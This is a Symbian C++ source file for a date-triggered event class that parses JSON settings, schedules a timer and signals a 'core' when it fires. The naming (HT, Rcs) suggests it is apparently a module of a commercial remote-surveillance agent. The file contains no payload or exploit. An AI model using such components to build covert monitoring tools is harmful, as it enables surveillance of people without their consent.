/*
 * EventDate.cpp
 *
 *  Created on: 21/dic/2011
 *      Author: Giovanna
 */

#include "EventDate.h"
#include <HT\TimeUtils.h>
	
#include "Json.h"

CEventDate::CEventDate(TUint32 aTriggerId) :
	CAbstractEvent(EEvent_Date, aTriggerId)
	{
	// No implementation required
	}

CEventDate::~CEventDate()
	{
	__FLOG(_L("Destructor"));
	delete iTimer;
	__FLOG(_L("End Destructor"));
	__FLOG_CLOSE;
	}

CEventDate* CEventDate::NewLC(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventDate* self = new (ELeave) CEventDate(aTriggerId);
	CleanupStack::PushL(self);
	self->ConstructL(params);
	return self;
	}

CEventDate* CEventDate::NewL(const TDesC8& params, TUint32 aTriggerId)
	{
	CEventDate* self = CEventDate::NewLC(params, aTriggerId);
	CleanupStack::Pop(); // self;
	return self;
	}
 
void CEventDate::ConstructL(const TDesC8& params)
	{
	__FLOG_OPEN_ID("HT", "EventTimer.txt");
	__FLOG(_L("-------------"));
	
	BaseConstructL(params);
	iTimer = CTimeOutTimer::NewL(*this);
	
	RBuf paramsBuf;
			
	TInt err = paramsBuf.Create(2*params.Size());
	if(err == KErrNone)
		{
		paramsBuf.Copy(params);
		}
	else
		{
		//TODO: not enough memory
		}
			
	paramsBuf.CleanupClosePushL();
	CJsonBuilder* jsonBuilder = CJsonBuilder::NewL();
	CleanupStack::PushL(jsonBuilder);
	jsonBuilder->BuildFromJsonStringL(paramsBuf);
	CJsonObject* rootObject;
	jsonBuilder->GetDocumentObject(rootObject);
	if(rootObject)
		{
		CleanupStack::PushL(rootObject);
		//retrieve exit action
		if(rootObject->Find(_L("end")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("end"),iDateParams.iExitAction);
			}
		else
			iDateParams.iExitAction = -1;
			
		//retrieve repeat action
		if(rootObject->Find(_L("repeat")) != KErrNotFound)
			{
			rootObject->GetIntL(_L("repeat"),iDateParams.iRepeatAction);
			rootObject->GetIntL(_L("iter"),iDateParams.iIter);
			rootObject->GetIntL(_L("delay"),iDateParams.iDelay);
			}
		else
			{
			iDateParams.iRepeatAction = -1;
			iDateParams.iIter = 0;
			iDateParams.iDelay = 0;
			}
		//retrieve date start
		TBuf<32> dateFrom;
		rootObject->GetStringL(_L("datefrom"),dateFrom);
		//config date string is in Japanese format yyyy-mm-dd, so we need to check locale settings
		//and change format if necessary
		TLocale tLoc;
		TDateFormat tForm = tLoc.DateFormat();
		if(tForm != EDateJapanese)
			{
			//force local date format
			tLoc.SetDateFormat(EDateJapanese);
			tLoc.Set();
			iTimeAt.Parse(dateFrom);
			//restore local date format
			tLoc.SetDateFormat(tForm);
			tLoc.Set();
			}
		else
			{
			iTimeAt.Parse(dateFrom);
			}
		//retrieve date to
		// TODO. when available
		
		CleanupStack::PopAndDestroy(rootObject);
		}
	CleanupStack::PopAndDestroy(jsonBuilder);
	CleanupStack::PopAndDestroy(&paramsBuf);
	}

void CEventDate::StartEventL()
	{
	__FLOG(_L("StartEventL"));
	__FLOG_2(_L("%d %d"), iTimerType, iSecondsInterv.Int()); 
	// First we have to check if the date is expired
	TTime now;
	now.UniversalTime();
	if (iTimeAt <= now)
		{
		TTimeIntervalSeconds secondsInterv = 3;
		iTimeAt.HomeTime();
		iTimeAt += secondsInterv;
		iTimer->RcsAt(iTimeAt);
		} 
	else 
		{
		iTimer->RcsAtUTC( iTimeAt ); 
		}		
	}


void CEventDate::TimerExpiredL(TAny* src)
	{
	__FLOG(_L("TimerExpiredL"));
	SendActionTriggerToCoreL();
	}
